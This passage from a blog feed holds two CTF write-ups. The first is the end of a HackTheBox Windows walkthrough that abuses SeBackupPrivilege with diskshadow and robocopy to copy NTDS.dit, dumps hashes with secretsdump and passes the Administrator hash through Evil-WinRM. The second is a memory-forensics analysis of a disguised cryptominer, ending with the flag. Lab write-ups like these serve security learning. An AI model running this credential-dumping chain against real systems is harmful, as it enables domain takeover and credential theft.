</code></pre></div></div> <hr/> <h2 id="privilege-escalation-and-reverse-shell">Privilege Escalation and Reverse Shell</h2> <p>With <strong>Emily Oscars’ credentials</strong> in hand, I decided to try for a remote session with <strong>Evil-WinRM</strong>.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> 10.10.11.35 <span class="nt">-u</span> <span class="s1">'emily.oscars'</span> <span class="nt">-p</span> <span class="s1">'Q!3@Lp#M6b*7t*Vt'</span>
</code></pre></div></div> <p>After logging in, I checked her <strong>privileges</strong> using <code class="language-plaintext highlighter-rouge">whoami /priv</code>. The output showed <strong>SeBackupPrivilege</strong> and <strong>SeRestorePrivilege</strong>, which are essential for accessing and modifying files usually restricted to admins:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SeBackupPrivilege
SeRestorePrivilege
</code></pre></div></div> <h3 id="directory-discovery-and-privilege-escalation-with-sebackupprivilege">Directory Discovery and Privilege Escalation with SeBackupPrivilege</h3> <p>Having <strong>SeBackupPrivilege</strong> meant I could attempt to access otherwise restricted system files, like <code class="language-plaintext highlighter-rouge">NTDS.dit</code>, which holds AD data. To exploit this, I wrote a <strong>diskshadow script</strong> to mount the C drive:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set metadata C:\Windows\Temp\meta.cab
add volume C: alias cdrive
expose %cdrive% E:
</code></pre></div></div> <p>Using <strong>diskshadow</strong> with this script allowed me to mount the drive for backup:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>diskshadow /s backup_script.txt
</code></pre></div></div> <h3 id="extracting-ntdsdit-with-robocopy">Extracting NTDS.dit with Robocopy</h3> <p>Once mounted, I used <strong>Robocopy</strong> to copy <code class="language-plaintext highlighter-rouge">NTDS.dit</code> and acquire <strong>encrypted AD user data</strong>:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>robocopy /b E:<span class="se">\W</span>indows<span class="se">\n</span>tds <span class="nb">.</span> ntds.dit
</code></pre></div></div> <p>I also needed the <strong>SYSTEM registry hive</strong> to decrypt these hashes, so I saved it using the <strong>reg save</strong> command:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg save hklm<span class="se">\s</span>ystem C:<span class="se">\U</span>sers<span class="se">\e</span>mily.oscars.CICADA<span class="se">\D</span>ocuments<span class="se">\s</span>ystem.bak
</code></pre></div></div> <h3 id="dumping-administrator-hash">Dumping Administrator Hash</h3> <p>I downloaded <code class="language-plaintext highlighter-rouge">ntds.dit</code> and <code class="language-plaintext highlighter-rouge">system.bak</code>, then used <strong>Impacket’s secretsdump</strong> to extract the <strong>Administrator NTLM hash</strong>:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket.secretsdump <span class="nt">-ntds</span> ntds.dit <span class="nt">-system</span> system.bak <span class="nb">local</span>
</code></pre></div></div> <p>Finally, with the Administrator hash, I logged in using Evil-WinRM to access the Administrator account:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> 10.10.11.35 <span class="nt">-u</span> Administrator <span class="nt">-H</span> &lt;<span class="nb">hash</span><span class="o">&gt;</span>
</code></pre></div></div> <p><strong>Flag:</strong> The <strong>root flag</strong> was located in <code class="language-plaintext highlighter-rouge">root.txt</code>.</p>]]></content><author><name></name></author><category term="htb"/><category term="windows"/><summary type="html"><![CDATA[Writeup for a Box in HackTheBox]]></summary></entry><entry><title type="html">CPUsage - ISITDU 2024</title><link href="https://diogoalexandreoliveiradasilva.github.io/blog/2024/CPUsage/" rel="alternate" type="text/html" title="CPUsage - ISITDU 2024"/><published>2024-10-30T18:25:40+00:00</published><updated>2024-10-30T18:25:40+00:00</updated><id>https://diogoalexandreoliveiradasilva.github.io/blog/2024/CPUsage</id><content type="html" xml:base="https://diogoalexandreoliveiradasilva.github.io/blog/2024/CPUsage/"><![CDATA[<h1 id="cpusage">CPUsage</h1> <p><strong>Author:</strong> p4pa<br/> <strong>Team:</strong> xSTF</p> <h2 id="info">INFO</h2> <ul> <li><strong>CTF:</strong> ISITDU 2024</li> <li><strong>Challenge:</strong> CPUsage</li> <li><strong>Category:</strong> Forensics</li> <li><strong>Description:</strong> My friend noticed high CPU usage after opening his laptop. I took a memory dump of his laptop and need you to investigate it. <ol> <li>What is the name of the malicious process, the full path of the process, and the parent process ID?</li> <li>What is the IP that the process communicates with, and the family name of the malware?</li> </ol> </li> </ul> <h2 id="writeup">WriteUP</h2> <h3 id="memory-dump">Memory Dump</h3> <ul> <li>This was my first <strong>Forensics</strong> CTF, and the description called for investigating a <strong>memory dump</strong>. The first step was selecting a tool suited to this context. <ul> <li>I found this GitHub repository that enumerates great <strong>memory forensics tools</strong>: <ul> <li><a href="https://github.com/digitalisx/awesome-memory-forensics">Awesome Memory Forensics</a></li> </ul> </li> <li>The tool that best suited the challenge was <strong>Volatility3</strong>, a robust framework for memory analysis. <ul> <li><a href="https://github.com/volatilityfoundation/volatility3">Volatility3</a></li> </ul> </li> </ul> </li> <li>With Volatility3 selected, I began analyzing the memory dump.</li> </ul> <h3 id="processes">Processes</h3> <ul> <li>I referred to <strong>Volatility3’s</strong> documentation and determined that examining the <strong>process list</strong> for anomalies would be a key initial step. I found <code class="language-plaintext highlighter-rouge">psscan</code> particularly helpful, as it organizes processes by <strong>hierarchy</strong> (showing parent-child relationships). <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  vol <span class="nt">-f</span> win10.raw windows.psscan <span class="o">&gt;</span> psscan.txt
</code></pre></div> </div> </li> <li>The output columns included essential process details: <ol> <li><code class="language-plaintext highlighter-rouge">PID</code>: Process ID</li> <li><code class="language-plaintext highlighter-rouge">PPID</code>: Parent Process ID</li> <li><code class="language-plaintext highlighter-rouge">ImageFileName</code>: Name of the executable file</li> <li><code class="language-plaintext highlighter-rouge">Offset(V)</code>: Virtual offset</li> <li><code class="language-plaintext highlighter-rouge">Threads</code>: Number of threads</li> <li><code class="language-plaintext highlighter-rouge">Handles</code>: Number of handles</li> <li><code class="language-plaintext highlighter-rouge">SessionId</code>: Session ID</li> <li><code class="language-plaintext highlighter-rouge">Wow64</code>: Indicates if the process is running under WOW64</li> <li><code class="language-plaintext highlighter-rouge">CreateTime</code>: Process creation time</li> <li><code class="language-plaintext highlighter-rouge">ExitTime</code>: Process exit time</li> <li><code class="language-plaintext highlighter-rouge">Audit</code>: Audit information</li> <li><code class="language-plaintext highlighter-rouge">Cmd</code>: Command line</li> <li><code class="language-plaintext highlighter-rouge">Path</code>: Full path of the executable file</li> </ol> </li> <li>One <strong>process</strong> stood out: <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">***</span> 2220	264	dlIhost.exe	0xb50e42a43080	9	-	0	False	2024-08-22 11:57:21.000000 	N/A	<span class="se">\D</span>evice<span class="se">\H</span>arddiskVolume3<span class="se">\U</span>sers<span class="se">\m</span>4shl3<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\D</span>LL<span class="se">\d</span>lIhost.exe	-	-
</code></pre></div> </div> </li> <li>This process raised suspicions for several reasons: <ul> <li><strong>Location</strong>: System processes are rarely located in <code class="language-plaintext highlighter-rouge">AppData\Roaming</code>.</li> <li><strong>Naming</strong>: Windows uses <code class="language-plaintext highlighter-rouge">dllhost.exe</code> as a legitimate system process, but here it was slightly altered to <strong>dlIhost.exe</strong> (substituting an ‘I’ for ‘l’).</li> </ul> </li> <li>This subtle change suggested the process might be <strong>malicious</strong>, using a near-identical name to evade detection.</li> </ul> <h3 id="malware">Malware</h3> <ul> <li>Next, I checked for <strong>memory regions</strong> with potentially <strong>injected code</strong> using Volatility3’s <code class="language-plaintext highlighter-rouge">malfind</code> command. <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  vol <span class="nt">-f</span> win10.raw windows.malfind <span class="o">&gt;</span> malfind
</code></pre></div> </div> </li> <li>The output validated my hypothesis: <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  2220	dlIhost.exe	0x203f2b00000	0x203f2b1ffff	VadS	PAGE_EXECUTE_READWRITE	32	1 Disabled	N/A	
</code></pre></div> </div> </li> <li>The <strong>dlIhost.exe process had injected code</strong>, confirming it as potentially malicious. Notable flags included: <ul> <li><strong>PAGE_EXECUTE_READWRITE</strong>: This memory protection allows the memory region to be read, written, and executed—ideal for malware looking to execute malicious code within an unsuspecting process’s memory space.</li> </ul> </li> </ul> <h3 id="network">Network</h3> <ul> <li>With <code class="language-plaintext highlighter-rouge">dlIhost.exe</code> confirmed as suspicious, I examined <strong>network activity</strong> to identify potential connections to external IPs. <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  vol <span class="nt">-f</span> win10.raw windows.netscan <span class="o">&gt;</span> netscan
</code></pre></div> </div> </li> <li>The output columns provided details on network connections: <ol> <li><code class="language-plaintext highlighter-rouge">Offset</code>: Memory offset</li> <li><code class="language-plaintext highlighter-rouge">Proto</code>: Protocol used (e.g., TCP, UDP)</li> <li><code class="language-plaintext highlighter-rouge">LocalAddr</code>: Local IP address</li> <li><code class="language-plaintext highlighter-rouge">LocalPort</code>: Local port number</li> <li><code class="language-plaintext highlighter-rouge">ForeignAddr</code>: Remote IP address</li> <li><code class="language-plaintext highlighter-rouge">ForeignPort</code>: Remote port number</li> <li><code class="language-plaintext highlighter-rouge">State</code>: Connection state (e.g., ESTABLISHED, LISTENING)</li> <li><code class="language-plaintext highlighter-rouge">PID</code>: Process ID</li> <li><code class="language-plaintext highlighter-rouge">Owner</code>: Owner of the process</li> <li><code class="language-plaintext highlighter-rouge">Created</code>: Creation time of the connection</li> </ol> </li> <li>Our target process had an <strong>active connection</strong> with the following entry: <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  0xb50e40f53260	TCPv4	192.168.253.128	49720	45.77.240.51	6198	ESTABLISHED	2220	dlIhost.exe	2024-08-22 11:58:04.000000 
</code></pre></div> </div> </li> <li>This showed <strong>dlIhost.exe</strong> communicating with <strong>45.77.240.51</strong>. <ul> <li>I conducted <strong>OSINT</strong> on this IP through <a href="https://www.virustotal.com/gui/ip-address/45.77.240.51">VIRUS TOTAL</a>, which flagged it as associated with known malware activity, further confirming this process as malicious.</li> </ul> </li> </ul> <h3 id="dumping">Dumping</h3> <ul> <li>To confirm the <strong>malware family</strong>, I decided to dump <strong>dlIhost.exe</strong> using Volatility3’s <code class="language-plaintext highlighter-rouge">dumpfiles</code> command. This captures the <strong>.dll</strong> and <strong>.exe</strong> files associated with the process. <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  vol <span class="nt">-f</span> win10.raw <span class="nt">-o</span> ./dump windows.dumpfiles <span class="nt">--pid</span> 2220
</code></pre></div> </div> </li> <li>With the file dumped, I uploaded it to <a href="https://www.virustotal.com/">VIRUS TOTAL</a> for analysis. Virus Total categorized it as <strong>harminer</strong>: <ul> <li><strong>Harminer</strong>: A Trojan commonly used as a <strong>cryptocurrency miner</strong> to mine Monero (XMR) on infected systems.</li> </ul> </li> </ul> <h3 id="solution">Solution</h3> <ul> <li><strong>Answers based on the information gathered</strong>: <ol> <li> <p><strong>Name of the malicious process:</strong> dlIhost.exe<br/> <strong>Full path of the process:</strong> <code class="language-plaintext highlighter-rouge">C:\Users\m4shl3\AppData\Roaming\DLL\dlIhost.exe</code><br/> <strong>Parent process ID:</strong> 264</p> </li> <li> <p><strong>IP that the process communicates with:</strong> 45.77.240.51<br/> <strong>Family name of the malware:</strong> harminer</p> </li> </ol> <ul> <li><strong>Flag format:</strong> ISITDTU{processName-FullPath-ID_ip-FamilyName}</li> </ul> </li> <li><strong>Flag:</strong> <code class="language-plaintext highlighter-rouge">ISITDTU{dlIhost.exe-C:\Users\m4shl3\AppData\Roaming\DLL\dlIhost.exe-264_45.77.240.51-harminer}</code></li> </ul>]]></content><author><name></name></author><category term="ctf"/><category term="forensics"/><summary type="html"><![CDATA[Writeup for a forensics CTF in ISITDU 2024]]></summary></entry></feed>